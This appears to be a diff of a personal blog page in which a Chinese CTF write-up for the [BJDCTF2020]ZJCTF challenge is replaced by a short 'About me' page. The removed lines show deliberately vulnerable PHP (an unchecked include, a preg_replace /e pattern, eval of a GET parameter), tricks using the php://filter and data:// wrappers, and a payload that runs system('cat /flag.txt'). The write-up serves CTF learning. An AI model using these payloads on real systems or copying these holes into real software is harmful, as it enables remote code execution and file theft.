@@ -5,7 +5,7 @@
     
 <meta charset="utf-8" >
 
-<title>[BJDCTF2020]ZJCTF，不过如此 | ev11ccaatt</title>
+<title>About me | ev11ccaatt</title>
 <meta name="description" content="人菜多学">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -80,67 +80,23 @@
       <div class="content-container">
         <div class="post-detail">
           
-          <h2 class="post-title">[BJDCTF2020]ZJCTF，不过如此</h2>
+          <h2 class="post-title">About me</h2>
           <div class="post-info post-detail-info">
             <span><i class="icon-calendar-outline"></i> 2021-03-21</span>
             
           </div>
           <div class="post-content">
-            <pre><code>&lt;?php
-
-error_reporting(0);
-$text = $_GET[&quot;text&quot;];
-$file = $_GET[&quot;file&quot;];
-if(isset($text)&amp;&amp;(file_get_contents($text,'r')===&quot;I have a dream&quot;)){
-    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,'r').&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
-    if(preg_match(&quot;/flag/&quot;,$file)){
-        die(&quot;Not now!&quot;);
-    }
-
-    include($file);  //next.php
-    
-}
-else{
-    highlight_file(__FILE__);
-}
-?&gt;
-</code></pre>
-<p>通过读入text和file来完成验证,由于对text采取的是file_get_contents,则需利用data:数据流封装器.</p>
-<p>无法直接读flag.php，但题目给了下一步的文件next.php。可用php://filter/convert.base64-encode/resource=next.php.</p>
-<p>读取解密后.</p>
-<pre><code>&lt;?php
-$id = $_GET['id'];
-$_SESSION['id'] = $id;
-
-function complex($re, $str) {
-    return preg_replace(
-        '/(' . $re . ')/ei',
-        'strtolower(&quot;\\1&quot;)',
-        $str
-    );
-}
-
-
-foreach($_GET as $re =&gt; $str) {
-    echo complex($re, $str). &quot;\n&quot;;
-}
-
-function getFlag(){
-	@eval($_GET['cmd']);
-}
-
-</code></pre>
-<p>这里利用了preg_replace /e模式下的代码执行问题.([深入研究preg_replace与代码执行](<a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行 - 先知社区 (aliyun.com)</a>))</p>
-<p>传入\S*=${getflag()}&amp;cmd=system('cat /flag.txt');(注意闭合)</p>
+            <p>西游挨踢大一学生(CUIT)<br>
+<s>MTX</s></p>
 
           </div>
         </div>
 
         
           <div class="next-post">
-            <a class="purple-link" href="https://ev11ccaatt.github.io/post/bjdctf2020mark-loves-cat-wp">
+            <a class="purple-link" href="https://ev11ccaatt.github.io/post/bjdctf2020zjctfbu-guo-ru-ci">
               <h3 class="post-title">
-                下一篇： [BJDCTF2020]Mark loves cat wp
+                下一篇：[BJDCTF2020]ZJCTF，不过如此
               </h3>
             </a>
           </div>
